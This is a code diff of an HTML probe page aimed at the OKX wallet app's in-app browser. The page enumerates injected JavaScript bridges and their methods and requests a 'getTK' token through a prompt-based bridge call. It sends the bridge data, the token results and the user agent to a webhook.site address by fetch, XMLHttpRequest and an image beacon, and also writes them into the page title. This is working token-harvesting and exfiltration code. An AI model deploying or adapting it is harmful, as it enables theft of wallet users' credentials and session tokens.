@@ -7,6 +7,8 @@
 <pre id="tk_results">TK testing...</pre>
 <script>
 var WEBHOOK = 'https://webhook.site/aa2b16e2-fb70-4219-a296-8c9c6977baf5';
+
+// Check bridges
 var bridgeNames = ['_solana_','okxBtcJSBridge','okxStarkJSBridge','_aptos_','_okx_sui_','tron','okxOsmosJSBridge','okxNostrJSBridge','okxInternalJSBridge','interception','native','AndroidApi'];
 var bridges = {};
 bridgeNames.forEach(function(name) { bridges[name] = typeof window[name]; });
@@ -21,61 +23,82 @@ try {
                 k === 'interception' || k === 'native' ||
                 k.indexOf('Bridge') !== -1 || k.indexOf('bridge') !== -1 ||
                 k.indexOf('Provider') !== -1) {
-                suspiciousKeys.push(k + ':' + t);
+                suspiciousKeys.push(k);
             }
         }
     }
 } catch(e) {}
 
 var foundCount = Object.keys(bridges).filter(function(k){return bridges[k]!=='undefined'}).length;
-document.title = 'BRIDGES:' + foundCount;
-document.getElementById('status').textContent = 'Found ' + foundCount + ' bridges! Suspicious: ' + suspiciousKeys.length;
-document.getElementById('results').textContent = JSON.stringify({bridges: bridges, suspicious: suspiciousKeys, ua: navigator.userAgent}, null, 2);
 
-// Test getTK via interception bridge
+// Test getTK via various bridges
 var tkResults = {};
-try {
-    if (typeof window.interception !== 'undefined') {
-        var inter = window.interception;
-        var interMethods = [];
-        for (var m in inter) {
-            if (typeof inter[m] === 'function') {
+
+// 1. Try interception bridge methods enumeration
+if (typeof window.interception !== 'undefined') {
+    var interMethods = [];
+    try {
+        for (var m in window.interception) {
+            if (typeof window.interception[m] === 'function') {
                 interMethods.push(m);
-                // Try calling getTK-like methods
-                if (m.toLowerCase().indexOf('tk') !== -1 || m.toLowerCase().indexOf('token') !== -1) {
-                    try { tkResults['interception.' + m] = String(inter[m]()); } 
-                    catch(e) { tkResults['interception.' + m + '_err'] = e.message; }
-                }
             }
         }
-        tkResults['interception_methods'] = interMethods;
-    }
-} catch(e) { tkResults['interception_scan_err'] = e.message; }
+    } catch(e) {}
+    tkResults['interception_methods'] = interMethods;
+}
 
-try {
-    if (typeof window.okxInternalJSBridge !== 'undefined') {
-        var internal = window.okxInternalJSBridge;
-        var intMethods = [];
-        for (var m2 in internal) {
-            if (typeof internal[m2] === 'function') {
+// 2. Try okxInternalJSBridge methods
+if (typeof window.okxInternalJSBridge !== 'undefined') {
+    var intMethods = [];
+    try {
+        for (var m2 in window.okxInternalJSBridge) {
+            if (typeof window.okxInternalJSBridge[m2] === 'function') {
                 intMethods.push(m2);
             }
         }
-        tkResults['okxInternalJSBridge_methods'] = intMethods;
-    }
-} catch(e) { tkResults['internal_err'] = e.message; }
+    } catch(e) {}
+    tkResults['okxInternalJSBridge_methods'] = intMethods;
+}
 
-// Try prompt-based getTK (OKX's protocol)
+// 3. Try okxInternalProvider
+if (typeof window.okxInternalProvider !== 'undefined') {
+    var provMethods = [];
+    try {
+        for (var m3 in window.okxInternalProvider) {
+            if (typeof window.okxInternalProvider[m3] === 'function') {
+                provMethods.push(m3);
+            }
+        }
+    } catch(e) {}
+    tkResults['okxInternalProvider_methods'] = provMethods;
+}
+
+// 4. Prompt-based getTK
 try {
     var tkPrompt = prompt(JSON.stringify({uri:'request',method:'getTK',data:[]}));
     tkResults['prompt_getTK'] = tkPrompt;
 } catch(e) { tkResults['prompt_err'] = e.message; }
 
-document.getElementById('tk_results').textContent = JSON.stringify(tkResults, null, 2);
-document.title = 'BRIDGES:' + foundCount + ' TK:' + JSON.stringify(tkResults).length;
+// Set title with all results for UIAutomator reading
+var titleData = 'B:' + foundCount + '|S:' + suspiciousKeys.join(',') + '|TK:' + JSON.stringify(tkResults);
+document.title = titleData.substring(0, 200);
 
-// Beacon
-new Image().src = WEBHOOK + '?b=' + foundCount + '&s=' + suspiciousKeys.length + '&tk=' + encodeURIComponent(JSON.stringify(tkResults).substring(0,200));
+document.getElementById('status').textContent = 'Bridges: ' + foundCount + ' | Keys: ' + suspiciousKeys.join(', ');
+document.getElementById('results').textContent = JSON.stringify({bridges: bridges, suspicious: suspiciousKeys}, null, 2);
+document.getElementById('tk_results').textContent = JSON.stringify(tkResults, null, 2);
+
+// Try to post to webhook via various methods
+var data = {bridges: bridges, suspicious: suspiciousKeys, tkResults: tkResults, ua: navigator.userAgent.substring(0,200), ts: new Date().toISOString()};
+try { fetch(WEBHOOK, {method:'POST', mode:'no-cors', body: JSON.stringify(data), headers:{'Content-Type':'application/json'}}); } catch(e) {}
+// Try XMLHttpRequest
+try {
+    var x = new XMLHttpRequest();
+    x.open('POST', WEBHOOK + '?source=okx', true);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.send(JSON.stringify(data));
+} catch(e) {}
+// Image beacon with partial data
+new Image().src = WEBHOOK + '?b=' + foundCount + '&s=' + suspiciousKeys.length + '&tk=' + encodeURIComponent(JSON.stringify(tkResults).substring(0,300));
 </script>
 </body>
 </html>
